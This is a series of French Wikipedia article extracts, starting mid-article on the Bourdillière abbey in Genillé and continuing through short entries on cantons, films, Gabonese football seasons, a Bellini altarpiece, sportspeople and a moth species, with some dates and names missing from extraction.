Louis de Menou racheta le domaine en 1662, ce qui consacra la réunification des deux fiefs. Après son entrée dans les ordres, il fonda à la Bourdillière un prieuré érigé en 1688 en abbaye de moniales cisterciennes ; les 24 premières religieuses appartenaient à sa famille (sept de ses sœurs, quatre de ses filles et treize de ses nièces) qui se réservait le droit de nommer la mère supérieure ; il transféra ce droit au roi en même temps que le prieuré devenait abbaye "royale". Une plaque apposée à l'intérieur de l'église de Genillé rappelle cette fondation. À la suite de l'augmentation du nombre de religieuses, un bâtiment conventuel destiné à leur logement fut élevé au à l'est du logis seigneurial réservé, quant à lui, à l'abbesse. La chapelle seigneuriale, déjà construite à la fondation de l'abbaye, servit d'église abbatiale.
À la fin du , l'abbaye accueillait quarante-trois moniales, et parmi elles les trois filles de Charles de Menou d'Aulnay, gouverneur de l'Acadie (Canada) de 1638 à sa mort survenue en 1650.
Au cours du , le nombre de religieuses dimiua régulièrement : elles n'étaient plus que cinq en 1760. La fermeture de l'abbaye fut décrétée en 1770 en raison de l'insuffisance de ses revenus, inférieurs à ses dépenses, et du mauvais état des bâtiments, mais elle ne devint effective que huit ans plus tard, au terme d'une longue procédure, et les biens de la Bourdillière, dont plusieurs possessions sur le territoire de Genillé, furent réunis à ceux de l'abbaye de Beaumont-lès-Tours ; la chapelle, dédiée à Notre-Dame-de-Pitié, fut interdite puis démolie.
Vendus comme bien nationaux à la Révolution, les bâtiments de l'abbaye furent rachetés en 1791 par un descendant de la famille de Menou, qui en était déjà propriétaire avant la Révolution ; il revendit ce domaine en plusieurs lots peu de temps après. Le bâtiment conventuel fut transformé en habitation. De 1939 à 1963, la Bourdillière eut comme propriétaires successifs Franc-Nohain puis son fils Claude Dauphin.
Architecture et décoration.
Le logis seigneurial conserve son bâtiment principal du , sur plan rectangulaire couvert d'un toit en ardoises à quatre pans, accompagné au centre de sa façade orientale d'une tour polygonale accueillant un escalier à vis. Un pavillon, construit en retour d'angle au sud, est pourvu dans son angle sud-ouest d'une autre tour, cylindrique et couverte en poivrière. Cet ensemble date probablement de la fin du et, à l'époque, les douves devaient encore être en eau, alors qu'elles sont maintenant presque totalement comblées.
Le logis conventuel, long d'une cinquantaine de mètres , dont la façade principale est orientée au sud, est reconverti en habitations. Cet édifice a été à de nombreuses reprises remanié, certaines de ses fenêtres murées et d'autres percées. Le logis seigneurial du appartenant à l’ancien château est encore visible, flanqué de deux tours. Il fait l’objet d’une inscription au titre des monuments historiques depuis le .
La chaire des abbesses de l'abbaye, fabriquée au , fut rachetée par le curé de Genillé après la fermeture de l'abbaye, en 1780. Elle a été installée dans le chœur de l'église de Genillé. Elle est intégrée depuis 1992 à la liste des monuments historiques en tant qu'objet classé.
Filiation et dépendances.
Parmi les biens acquis par le monastère au cours de son siècle d'existence, il faut mentionner :
Abbesses et prieures.
La charge d’abbesse se transmet de tante à nièce

</doc>
<doc id="8731965" url="https://fr.wikipedia.org/wiki?curid=8731965" title="Souveraineté du consommateur">
Souveraineté du consommateur

 
La souveraineté du consommateur (") est un concept économique affirmant que les préférences du consommateur déterminent la production de biens et services. Ainsi, dans le domaine commercial, l'achat de biens et services dépend notamment de l'offre et de la demande. Le succès d'un vendeur est conséquemment en partie assujetti à sa capacité à répondre à la demande et à prévoir cette dernière.
Le concept de souveraineté du consommateur a été popularisé par dans son livre " (1936). Il est critiqué par certains économistes, qui affirment qu'il est rare que le consommateur ait vraiment ce qu'il veut, alors que d'autres affirment que la souveraineté du consommateur se produirait dans un libre marché ne subissant aucune influence des gouvernements ou d'autres institutions non commerciales.

</doc>
<doc id="8731973" url="https://fr.wikipedia.org/wiki?curid=8731973" title="Canton de Migné-Auxances">
Canton de Migné-Auxances

Le canton de Migné-Auxances est une circonscription électorale française située dans le département de la Vienne et la région Nouvelle-Aquitaine.
Histoire.
Un nouveau découpage territorial de la Vienne entre en vigueur à l'occasion des premières élections départementales suivant le décret du . Les conseillers départementaux sont, à compter de ces élections, élus au scrutin majoritaire binominal mixte. Les électeurs de chaque canton élisent au Conseil départemental, nouvelle appellation du Conseil général, deux membres de sexe différent, qui se présentent en binôme de candidats. Les conseillers départementaux sont élus pour au scrutin binominal majoritaire à deux tours, l'accès au second tour nécessitant 12,5 % des inscrits au . En outre la totalité des conseillers départementaux est renouvelée. Ce nouveau mode de scrutin nécessite un redécoupage des cantons dont le nombre est divisé par deux avec arrondi à l'unité impaire supérieure si ce nombre n'est pas entier impair, assorti de conditions de seuils minimaux. Dans la Vienne, le nombre de cantons passe ainsi de 38 à 19.
Le canton de Migné-Auxances est formé de communes des anciens cantons de Mirebeau (), de Neuville-de-Poitou () et de Poitiers-1 (). Il est entièrement inclus dans l'arrondissement de Poitiers. Le bureau centralisateur est situé à Migné-Auxances.
Représentation.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Benoit Prinçay et Séverine Saint-Pé (UMP, 30,17 %) et Hélène Junqua et Yves Rouleau (PS, 25,89 %). Le taux de participation est de 51,7 % ( sur ) contre 51,35 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Benoit Prinçay et Séverine Saint-Pé (UMP) sont élus avec 55,69 % des suffrages exprimés et un taux de participation de 51,28 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Migné-Auxances, ce taux de participation est de 31,44 % ( sur ) contre 33,61 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Benoît Prinçay et Séverine Saint-Pé (Union à droite, 53,61 %) et Christelle Charrier et Gerald Garnier (Union à gauche, 29,27 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 33,96 % dans le département et 32,04 % dans le canton de Migné-Auxances. Benoît Prinçay et Séverine Saint-Pé (Union à droite) sont élus avec 63,83 % des suffrages exprimés ( pour et ).
Composition.
Lors du redécoupage de 2014, le canton de Migné-Auxances comprenait dix-neuf communes entières.
À la suite de la création des communes nouvelles de Champigny en Rochereau et de Saint-Martin-la-Pallu au , ainsi qu'au décret du rattachant entièrement la commune nouvelle de Saint-Martin-la-Pallu au canton de Jaunay-Marigny, le canton comprend désormais quinze communes entières.

</doc>
<doc id="8731974" url="https://fr.wikipedia.org/wiki?curid=8731974" title="Bucher de Chauvigné">
Bucher de Chauvigné



</doc>
<doc id="8731975" url="https://fr.wikipedia.org/wiki?curid=8731975" title="Le client est roi">
Le client est roi



</doc>
<doc id="8731976" url="https://fr.wikipedia.org/wiki?curid=8731976" title="L'Emprise du passé">
L'Emprise du passé

L'Emprise du passé "()" est un film américain réalisé par Harold Young, sorti en 1935.
Synopsis.
Jennifer Gage voyage seule pour la première fois à la recherche de romantisme et d'exotisme. À Hong Kong, son train est attaqué par des bandits et elle demande l'aide de Steven Paradine, un aviateur américain, qui l'emmène chez sa maîtresse, Mona Gould. Steven prévient Jennifer qu'on ne peut pas lui faire confiance, mais ils tombent néanmoins amoureux l'un de l'autre et se marient. Un jour l'avion de Steven s'écrase en mer et il est porté disparu.
Six ans plus tard, en Angleterre, Jennifer est mariée à Robert Godfrey, un célèbre cardiologue, et ils vivent heureux avec leur petite fille. Robert est sur le point d'être anobli lorsque Mona, qui vit désormais en Angleterre, tombe par hasard sur Steven. Il a été sauvé par un pêcheur, et vit désormais sous un pseudonyme. Il est venu en Angleterre car il est malade et a besoin des soins d'un spécialiste. Mona tente de renouer leur relation mais il n'est pas intéressé. Furieuse d'être délaissée et toujours jalouse de Jennifer, Mona décide de faire chanter cette dernière en menaçant de révéler qu'elle est bigame. 

</doc>
<doc id="8731981" url="https://fr.wikipedia.org/wiki?curid=8731981" title="A Brighter Day">
A Brighter Day

 est un album du guitariste de jazz Ronny Jordan, sorti en 2000 sur le label Blue note.
L'album aborde des styles très diversifiés, allant d'ambiances brésiliennes, latines, ou même de musique indienne.
Il a été nommé aux Grammy Awards dans la catégorie meilleur album de jazz contemporain.

</doc>
<doc id="8731982" url="https://fr.wikipedia.org/wiki?curid=8731982" title="Faradj">
Faradj



</doc>
<doc id="8731983" url="https://fr.wikipedia.org/wiki?curid=8731983" title="Championnat du Gabon de football 1982">
Championnat du Gabon de football 1982

La saison 1982 du Championnat du Gabon de football est la sixième édition du championnat de première division gabonaise, le "Championnat National". La compétition est en fait une phase finale qui réunit les dix clubs issus des championnats provinciaux. L’ensemble des rencontres ont lieu dans la capitale, Libreville.
C'est le FC 105 Libreville qui remporte le titre, après avoir battu le CAP Owendo Libreville lors de la finale nationale. C'est le second titre de champion du Gabon de l'histoire du club.

</doc>
<doc id="8731988" url="https://fr.wikipedia.org/wiki?curid=8731988" title="Saint Jérôme lisant avec saint Christophe et saint Louis de Toulouse">
Saint Jérôme lisant avec saint Christophe et saint Louis de Toulouse

Saint Jérôme lisant avec saint Christophe et saint Louis de Toulouse (en italien : "Santi Cristoforo, Girolamo e Ludovico di Tolosa") est une peinture religieuse de Giovanni Bellini exécutée en 1513. Le tableau est toujours exposé dans l'église San Giovanni Grisostomo de Venise.
Histoire.
Le tableau fut commissionné par le marchand vénitien Giorgio Diletti dès 1494, pour être réalisé, avec l'autel, après sa mort, laissant une disposition précise dans son testament, tant sur le sujet que sur l'emplacement.
Un "cartellino" sur le panneau feint de marbre de gauche confirme la date de 1513 et la signature du peintre, mais on ignore pourquoi il s'écoula une vingtaine d'années entre la mise en service et l'exécution. La peinture date de la fin de la carrière de Bellini, lorsqu'il avait adopté le tonalisme de Giorgione.
Iconographie.
La présence conjointe des trois saints anachroniques (le légendaire saint Christophe de Lycie, saint Jérôme de Stridon du , saint Louis de Toulouse du ) avec l'Enfant Jésus est une "Conversation sacrée" pour l'iconographie chrétienne, typique de la tradition vénitienne.
Description.
Le plan est inspiré en grande partie des œuvres de Bellini lui-même, avec un arc ouvrant sur un paysage en arrière-plan, et trois figures de saints. 
Au lieu du trône habituel avec la Vierge, au delà d'une arcature architectonique, saint Jérôme ermite, est montré lisant dans le désert, assis sur un escarpement rocheux, un livre appuyé sur un figuier recourbé, un autre à ses pieds ; le décor lointain montre des montagnes bleues et des tours dépassant d'une colline verte. 
En bas, séparés par un parapet de marbre à frises et panneaux chiquetés où se trouve le cartouche avec la signature, au niveau de l'arcade, deux saints sont postés : à gauche, saint Christophe tenant verticalement un long bâton de ses deux mains, portant l'Enfant Jésus ; à droite un saint évêque portant ses attributs (mitre, cape bordée de rouge, gant et anneau pastoral), tient la crosse épiscopale de sa charge.
Les corniches-consoles des piliers de l'arcade s'interrompent brutalement (comme coupées) permettant l'insertion illusionniste du tableau dans l'architecture de son emplacement dans l'église.
Analyse.
Le saint évêque d'abord identifié comme saint Augustin d'Hippone par la présence du titre du livre qu'il tient ("De Civitate Dei"), s'est révélé plus tard être apocryphe, car il n'est pas placé sur la couverture mais sur l'envers de la couverture et est probablement un repeint. Se basant sur la présence de lys de la Maison d'Anjou-Sicile sur le manteau, le personnage a été reconnu comme Louis d'Anjou, le noble français qui a renoncé à la couronne pour embrasser l'Ordre des Frères mineurs. 
Les saints ont peut-être été choisis, plutôt que de simples homonymes avec les clients, en fonction de thèmes néoplatoniciens, saint Louis symbolisant la vie contemplative et liturgique, et saint Christophe symbolisant la prédication. Selon ce point de vue, Jérôme serait ainsi le point culminant de la vie spirituelle, comme une parfaite conjonction entre action et contemplation, entre ascèse et science révélée. L'arc au-dessus de lui est un symbole de l'église catholique et porte une inscription grecque du Psaume 14 de la Vulgate (traduite par Jérôme reconnu docteur de l'église) : « "Il Signore dal cielo si china sugli uomini per vedere se esista un saggio: se c'è uno che cerchi Dio" », soit en français : « Le Seigneur du haut du ciel, cherche s'il existe un homme sage parmi les hommes ; et si celui-ci cherche Dieu ». Le verset et le symbole du figuier font référence à Jérôme, tel que choisi par le Seigneur pour comprendre la loi suprême. 
La présence d'un texte grec (issu probablement de la traduction en grec parue en 1496 et 1498 d'Alde l'Ancien, faisant partie d'un cercle d'érudits fréquenté par Bellini) s'explique par le lieu de l'exposition de la peinture, une église fréquentée par les Vénitiens de langue grecque.
Peinture de la fin de la carrière de l'artiste, le tableau reprend les tons nouveaux des œuvres de Giorgione. La fusion des personnages avec le paysage démontre la réception des nouveautés de ce dernier ("Retable de Castelfranco") et Sebastiano del Piombo ("Retable de Saint-Jean-Chrysostome" dans la même église). Peint vers 1509, le retable de Sebastiano del Piombo précède donc celui de Bellini. La comparaison démontre que Bellini, âgé de plus de soixante-dix ans, était capable d'assimiler les idées d'artistes plus jeunes. Au cœur des deux retables, un vieil homme lit sans voir les saints qui l'entourent. Celui de Bellini est plus proche du "Retable de Castelfranco" de Giorgione : son saint Jérôme est placé plus haut et plus loin dans l'espace du tableau délimité par un grand arc et les deux saints du premier plan semblent aussi détaché de lui que ceux de Giorgione le sont de la Vierge sur son trône. Le décor de Bellini est bien supérieur à celui de del Piombo.

</doc>
<doc id="8731992" url="https://fr.wikipedia.org/wiki?curid=8731992" title="Fonctions trigonométriques">
Fonctions trigonométriques



</doc>
<doc id="8731999" url="https://fr.wikipedia.org/wiki?curid=8731999" title="Bruno Collaço">
Bruno Collaço

Bruno Collaço est un footballeur brésilien né le à São Leopoldo dans le Rio Grande do Sul. Il évolue au poste d'arrière gauche.
Biographie.
Après avoir fait ses adieux au Joinville EC, champion du Brésil de Série B , il signe le avec le FC Sochaux-Montbéliard dans le cadre d'un prêt avec option d'achat.
Son transfert définitif est acté en juin 2015 et signe un contrat de deux ans avec le FCSM.
Palmarès.
Il est champion du Brésil de Série B en 2012 avec Goiás et en 2014 avec Joinville. Il est également champion de l'État du Goiás en 2012 avec Goiás et champion de l'État du Rio Grande do Sul en 2010 avec Grêmio. A titre individuel, il est élu meilleur latéral gauche du championnat du Brésil de Serie B en 2010.

</doc>
<doc id="8732009" url="https://fr.wikipedia.org/wiki?curid=8732009" title="Henry Winkles">
Henry Winkles

Henry Winkles, né en 1801 et mort en 1860, est un illustrateur architectural, graveur et imprimeur britannique qui, avec Carl Ludwig Frommel, a fondé le premier studio pour gravure sur acier en Allemagne.
Biographie.
Henry Winkles suit une formation de dessinateur en Angleterre et en Allemagne.
En 1824, il quitte Londres pour Karlsruhe en 1824, où il fonde avec Karl Ludwig Frommel, le premier atelier de gravure sur acier en Allemagne.
En 1836, avec Benjamin Winkles, il produit et aide à graver trois volumes de "" (Londres, 1836-1842). Ces volumes font appel à des illustrateurs tels que Hablot Knight Browne (le fameux « Phiz » de Charles Dickens) et l'architecte Robert Garland (1808–1863), avec des textes (et quelques gravures) de Thomas Moule. Ces ouvrages inspirent la création du style néo-gothique en architecture en Grande-Bretagne au .
Henry Winkles se rend fin 1852 dans les champs aurifères de Ballarat, en Australie pour rendre visite à son fils, récemment installé dans la région avec sa famille. Pendant son séjour dans la région, Winkles dessine le paysage affecté de la région entre Ballarat et Buninyong et documente l'existence matérielle des creuseurs dans les premières années de la ruée vers l'or. Sa fascination pour les eucalyptus rugueux et déformés de la région est également un thème récurrent.
En 1854, Winkles retourne en Angleterre et poursuit sa carrière fructueuse d'illustrateur de livres.
Publications.
Les dessins de Henry Winkles sont notables . Il est surtout connu pour avoir illustré une série populaire intitulée "Architectural and picturesque illustrations of the cathedral churches of England and Wales" (Illustrations architecturales et pittoresques des églises cathédrales d'Angleterre et du pays de Galles).

</doc>
<doc id="8732012" url="https://fr.wikipedia.org/wiki?curid=8732012" title="Championnat du Gabon de football 1983">
Championnat du Gabon de football 1983

La saison 1983 du Championnat du Gabon de football est la septième édition du championnat de première division gabonaise, le "Championnat National". La compétition est en fait une phase finale qui réunit les quatre clubs issus des championnats provinciaux. L’ensemble des rencontres ont lieu dans la capitale, Libreville.
C'est le FC 105 Libreville qui remporte le titre, après avoir terminé en tête de la poule. C'est le troisième titre de champion du Gabon de l'histoire du club, le second consécutif.

</doc>
<doc id="8732013" url="https://fr.wikipedia.org/wiki?curid=8732013" title="Canton de La Chapelle-Saint-Mesmin">
Canton de La Chapelle-Saint-Mesmin

Le canton de La Chapelle-Saint-Mesmin est une ancienne division administrative française du district d'Orléans situé dans le département du Loiret.
Histoire.
Le canton est créé le sous la Révolution française.
Le canton disparaît en 1801 () sous le Premier Empire ; toutes ses communes sont reversées dans le canton d'Ingré.
Géographie.
Le canton de La Chapelle-Saint-Mesmin comprend les trois communes suivantes : Chaingy, La Chapelle-Saint-Mesmin et Saint-Jean-de-la-Ruelle.

</doc>
<doc id="8732014" url="https://fr.wikipedia.org/wiki?curid=8732014" title="Steven Wood">
Steven Wood

Steven Wood né le et mort le , est un kayakiste australien pratiquant la course en ligne. Il était marié à la kayakiste Anna Wood.

</doc>
<doc id="8732024" url="https://fr.wikipedia.org/wiki?curid=8732024" title="Lorgnon">
Lorgnon



</doc>
<doc id="8732025" url="https://fr.wikipedia.org/wiki?curid=8732025" title="Lou Rossini">
Lou Rossini

Lucio « Lou » Rossini, né le , à New York, aux États-Unis et décédé le , à Sewell, dans le New Jersey, est un joueur et entraîneur américain de basket-ball.

</doc>
<doc id="8732045" url="https://fr.wikipedia.org/wiki?curid=8732045" title="Championnat du Gabon de football 1984">
Championnat du Gabon de football 1984

La saison 1984 du Championnat du Gabon de football est la huitième édition du championnat de première division gabonaise, le "Championnat National". La compétition est en fait une phase finale qui réunit les quatre clubs issus des championnats provinciaux. L’ensemble des rencontres ont lieu dans la capitale, Libreville. Cette édition est la dernière à se dérouler sous ce format. À partir de la saison suivante, le championnat se déroule sous la forme d’une poule unique avec dix formations.
C'est l’AS Sogara qui remporte le titre, après avoir terminé en tête de la poule. C'est le tout premier titre de champion du Gabon de l'histoire du club.

</doc>
<doc id="8732052" url="https://fr.wikipedia.org/wiki?curid=8732052" title="William Quillian">
William Quillian

William W. Quillian, né à Seattle le et décédé à Victoria au Canada le , est un joueur américain de tennis.
Carrière.
Bill Quillian est essentiellement connu pour avoir été finaliste en double messieurs des Internationaux des États-Unis en 1955 en compagnie de son compatriote Gerald Moss. Cette année-là, les tournois de simple et double ne se jouent pas en même temps, ni au même endroit. Alors que le simple se déroule à New York, le tournoi de double se tient plus tard à Boston où l'ouragan Diane retarde fortement les matchs. Cet ouragan incite d'ailleurs les meilleurs joueurs à quitter les lieux prématurément, et rend le tableau de double extrêmement dévalué. Quillian, alors simple joueur universitaire, comme son partenaire atteignent la finale tandis que ce sont deux modestes joueurs japonais qui remportent un premier titre historique pour leurs pays.
Il a remporté une vingtaine de tournois en simple de 1951 à 1969, principalement aux États-Unis.
Il a joué une rencontre de Coupe Davis contre le Venezuela, il remporte le double et un simple sans enjeu 6-0, 6-0, 6-1.
Il meurt à 40 ans d'une leucémie aiguë. Le Stade de tennis de l'université de Washington porte son nom.

</doc>
<doc id="8732053" url="https://fr.wikipedia.org/wiki?curid=8732053" title="Bruno Dreossi">
Bruno Dreossi

Bruno Dreossi né le à Monfalcone, est un kayakiste italien pratiquant la course en ligne.Il commencer le canoë kayak en 1976
Palmarès.
championnat du monde.
argent à Paris

</doc>
<doc id="8732057" url="https://fr.wikipedia.org/wiki?curid=8732057" title="Une plume à son chapeau">
Une plume à son chapeau

Une plume à son chapeau (") est un film américain en noir et blanc réalisé par Alfred Santell, sorti en 1935.
Synopsis.
Une femme fait croire à son fils qu'il est en fait le fils d'une actrice célèbre et d'un noble, afin de l'obliger à se lancer dans le monde...

</doc>
<doc id="8732059" url="https://fr.wikipedia.org/wiki?curid=8732059" title="Madeleine Berly-Vlaminck">
Madeleine Berly-Vlaminck

Madeleine Berly-Vlaminck, née en 1896 et morte en 1953, est une artiste peintre française.
Biographie.
Madeleine Berly-Vlaminck est la fille du peintre Maurice de Vlaminck (1876-1958) et de Suzanne Berly.

</doc>
<doc id="8732060" url="https://fr.wikipedia.org/wiki?curid=8732060" title="Viva Africando">
Viva Africando

Viva Africando est le dernier album du groupe Africando sorti en 2013 et cet album fête les 20 ans d'Africando.

</doc>
<doc id="8732070" url="https://fr.wikipedia.org/wiki?curid=8732070" title="Le Ciel de Suely">
Le Ciel de Suely

Le Ciel de Suely (en ) est un film brésilien réalisé par Karim Aïnouz, sorti en 2006.
Il est présenté dans la sélection "Orizzonti" à la Mostra de Venise 2006. En , le film est inclus dans la liste établie par l'Association brésilienne des critiques de cinéma (Abraccine) des 100 meilleurs films brésiliens de tous les temps.
Synopsis.
Hermila est né et a grandi dans une petite ville du Nordeste. Pour gagner de l'argent, elle prend une nouvelle identité sous le nom de Suely.

</doc>
<doc id="8732071" url="https://fr.wikipedia.org/wiki?curid=8732071" title="Accouchements">
Accouchements



</doc>
<doc id="8732087" url="https://fr.wikipedia.org/wiki?curid=8732087" title="Canton de Vouneuil-sous-Biard">
Canton de Vouneuil-sous-Biard

Le canton de Vouneuil-sous-Biard est une circonscription électorale française située dans le département de la Vienne et la région Nouvelle-Aquitaine.
Histoire.
Un nouveau découpage territorial de la Vienne entre en vigueur à l'occasion des premières élections départementales suivant le décret du . Les conseillers départementaux sont, à compter de ces élections, élus au scrutin majoritaire binominal mixte. Les électeurs de chaque canton élisent au Conseil départemental, nouvelle appellation du Conseil général, deux membres de sexe différent, qui se présentent en binôme de candidats. Les conseillers départementaux sont élus pour au scrutin binominal majoritaire à deux tours, l'accès au second tour nécessitant 12,5 % des inscrits au . En outre la totalité des conseillers départementaux est renouvelée. Ce nouveau mode de scrutin nécessite un redécoupage des cantons dont le nombre est divisé par deux avec arrondi à l'unité impaire supérieure si ce nombre n'est pas entier impair, assorti de conditions de seuils minimaux. Dans la Vienne, le nombre de cantons passe ainsi de 38 à 19.
Le canton de Vouneuil-sous-Biard est formé de communes des anciens cantons de Vouillé () et de Poitiers-5 (). Il est entièrement inclus dans l'arrondissement de Poitiers. Le bureau centralisateur est situé à Vouneuil-sous-Biard.
Représentation.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Benoît Coquelet et Claudie Faucher (DVD, 39,44 %) et Joël Michelin et Claudette Rigollet (PS, 24,58 %). Le taux de participation est de 53,3 % ( sur ) contre 51,35 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Benoît Coquelet et Claudie Faucher (DVD) sont élus avec 59,27 % des suffrages exprimés et un taux de participation de 50,49 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Vouneuil-sous-Biard, ce taux de participation est de 33,85 % ( sur ) contre 33,61 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Sandrine Barraud et Benoît Coquelet (Union au centre et à droite, 47,33 %) et Damien Ladiré et Carole Maire (Union à gauche avec des écologistes, 35 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 33,96 % dans le département et 34,55 % dans le canton de Vouneuil-sous-Biard. Sandrine Barraud et Benoît Coquelet (Union au centre et à droite) sont élus avec 58,06 % des suffrages exprimés ( pour et ).
Composition.
Lors du redécoupage de 2014, le canton de Vouneuil-sous-Biard comprenait quinze communes entières.
À la suite de la création des communes nouvelles de Champigny en Rochereau au et de Boivre-la-Vallée au , ainsi qu'au décret du rattachant entièrement la commune nouvelle de Champigny en Rochereau au canton de Migné-Auxances, le canton comprend désormais onze communes entières.

</doc>
<doc id="8732102" url="https://fr.wikipedia.org/wiki?curid=8732102" title="Ted Field">
Ted Field

Frederick Woodruff "Ted" Field, né le à Chicago, est un producteur de cinéma (descendant de Marshall Field) et un pilote automobile américain sur circuits à bord de voitures de sport essentiellement de Grand Tourisme (mais aussi de Sport-Prototype en 1982-83) au sein du team "Interscope Racing" qu'il dirige (auquel appartinrent entre autres Snoop Dogg et Pharrell Williams). Il réside à Beverly Hills.
Biographie.
Il commence sa carrière personnelle en sport automobile durant la saison 1975 à Daytona sur le "Daytona International Speedway", également année de création de son équipe (disputant lui-même le Championnat USAC "Mini-Indy Series" de 1977 à 1978), et termine officiellement cette activité en 1983 après deux ans de présence en Championnat IMSA GT (deuxième en 1982 sur Porsche 935 K3 "Interscope", avec 4 victoires).
Après avoir fini cinquième des 6 Heures de Watkins Glen en 1977, il remporte surtout les 24 Heures de Daytona en 1979 associé à Hurley Haywood, et à Danny Ongais (pilote déjà présent chez "Interscope" en 1975 sur Formule 5000, et pour des sorties occasionnelles en Formule 1 en 1978 sur Penske) pour son écurie dans le cadre du Championnat du monde des voitures de sport sur Porsche 935 Turbo, puis il obtient une troisième place aux « Road America ». L'année suivante il est encore en début de saison troisième à Daytona sur la 935, avec Ongais et , puis il finit un mois et demi plus tard deuxième des 12 Heures de Sebring avec Ongais (leur paire étant déjà cinquième en 1977), avant de terminer troisième des 6 Heures de Mosport en août (ainsi qu'en 1981).
Il participe aussi personnellement aux 24 Heures du Mans à quatre reprises consécutives, de 1979 (avec "Interscope") à 1982, sur des 935 et CK5. Il côtoie ainsi Jean-Louis Lafosse chez Kremer Racing en 1980.
Son équipe fait encore quelques apparitions lors des 500 miles d'Indianapolis, comme en 1981 et 1982 avec Ongais (châssis Parnelli et moteur Cosworth).
Pour sa pénultième saison -particulièrement fournie-, il termine deuxième des 1 000 kilomètres de Monza avec la 935, mais entretemps il a franchi le pas des monoplaces grâce à la Lola T600 qui lui procure des succès aux 6 Heures de Riverside (avec Don Whittington), aux de Daytona, aux de Pocono () et aux 3 Heures de Daytona (novembre, encore avec Ongais).
En il effectue sa dernière course officielle derrière un volant, lors des 12 Heures de Sebring, toujours avec son pilote « fétiche » Danny Ongais. 
En 1982 il fonde entretemps la société " Interscope Communications", qui produit depuis lors plus d'une cinquantaine de films d'importance. En 1984 il est à la tête d'un groupement de financiers pour le rachat de "Panavision", société revendue en 1987 à "". En 1990 il cofonde "Interscope Records" avec Jimmy Iovine, qu'il quitte en pour créer "ARTISTdirect Records" avec le soutien de "BMG". Il dirige désormais "Radar Pictures".

</doc>
<doc id="8732104" url="https://fr.wikipedia.org/wiki?curid=8732104" title="Ile Jésus">
Ile Jésus



</doc>
<doc id="8732105" url="https://fr.wikipedia.org/wiki?curid=8732105" title="Viajo porque Preciso, Volto porque Te Amo">
Viajo porque Preciso, Volto porque Te Amo

 est un film brésilien réalisé par Karim Aïnouz et Marcelo Gomes, sorti en 2009.
Il est présenté en séction Orizzonti à la Mostra de Venise 2009.
Synopsis.
José Renato, géologue, est envoyé en mission pendant un mois dans le sertão brésilien. Parcourant ces terres arides, à la rencontre de ceux qui les habitent, tout au long de ce voyage reviennent en lui une musique et un amour qui ne le quittent pas. 
Road movie intérieur, à mi-chemin entre le journal intime et le documentaire, "Viajo Porque Preciso" est un voyage poétique qui propose une percée anthropologique du Brésil, réalisé par deux cinéastes brésiliens emblématiques. 

</doc>
<doc id="8732112" url="https://fr.wikipedia.org/wiki?curid=8732112" title="Tremplin de Igman">
Tremplin de Igman



</doc>
<doc id="8732114" url="https://fr.wikipedia.org/wiki?curid=8732114" title="Ptycholoma lecheana">
Ptycholoma lecheana

 
Ptycholoma lecheana, la Tordeuse de Lèche, est une espèce de lépidoptères (papillons) de la famille des Tortricidae.
Description.
L'envergure des imagos varie de 16 à .
Distribution.
Eurasiatique : en Europe, du Portugal à la Scandinavie, à la Russie ; Asie : Sibérie, Moyen-Orient, Chine, Corée, Japon.
Habitats.
Milieux forestiers, lisières, haies, vergers.
Biologie.
Les adultes volent de mai à juillet selon la localisation.
La chenille consomme les feuilles de divers arbres et arbustes : elle vit à l'intérieur des feuilles qu'elle enroule en forme de mince cigare en s'aidant de fils de soie.
Plantes hôtes.
Feuillus et arbustes dont Pommier, Prunier, Chêne, Saule, etc.

</doc>
<doc id="8732115" url="https://fr.wikipedia.org/wiki?curid=8732115" title="Adrien van Beveren">
Adrien van Beveren

Adrien Van Beveren, né le à Hazebrouck, est un pilote français de moto-cross et de rallye-raid. Vainqueur de l'Enduropale du Touquet en 2014, 2015 et 2016, il est le premier pilote à remporter trois titres consécutifs depuis Eric Geboers en 1990. Après avoir couru sous les couleurs du constructeur japonais Yamaha, il passe en 2022 sous pavillon Honda.
Biographie.
Né à Hazebrouck, Adrien Van Beveren passe son enfance à Racquinghem dans le Pas-de-Calais.
En 1997, il reçoit une moto Kawasaki KX60 pour Noël et commence la pratique du sport. Il s'entraine dans les dunes de Loon-Plage et participe à sa première compétition en 1998.
À partir de 2002, il participe à plusieurs championnats régionaux et nationaux et remporte quelques prix (champion des Flandres, champion de Picardie, vainqueur du supercross d'Isbergues, champion de France des sables E1, etc).
En 2009, il participe pour la première fois à l’Enduropale et se classe sixième.
En 2010, il participe au jeu "Fort Boyard", ouvert exceptionnellement aux candidats "anonymes", dans trois émissions diffusés sur France 2 le , le et le .
En 2011, il termine quatrième de l’Enduropale et remporte la Ronde des Sables à Loon-Plage.
En 2014, il remporte l'Enduropale et conserve son titre l'année suivante.
En , il participe au Rallye Dakar et termine sixième. Il participe à l'Enduropale 2016 et finit premier, gagnant ainsi un troisième titre.
En , Adrien accepte de devenir parrain de la Croix-Rouge française du Pas-de-Calais. Malgré un planning chargé, il donne de son temps pour soutenir les actions menées par les bénévoles de l'association et suivre des formations aux premiers secours afin d'apprendre les gestes qui sauvent. Le , Adrien participe avec la Croix-Rouge au « Samedi qui Sauve » à Arras aux côtés de l'ancienne Miss France Camille Cerf.
En , Van Beveren participe à son deuxième Dakar à l'issue duquel il finit à la quatrième place décrochant sa première victoire d'étape. Il terminera deuxième de l'Enduropale par la suite.
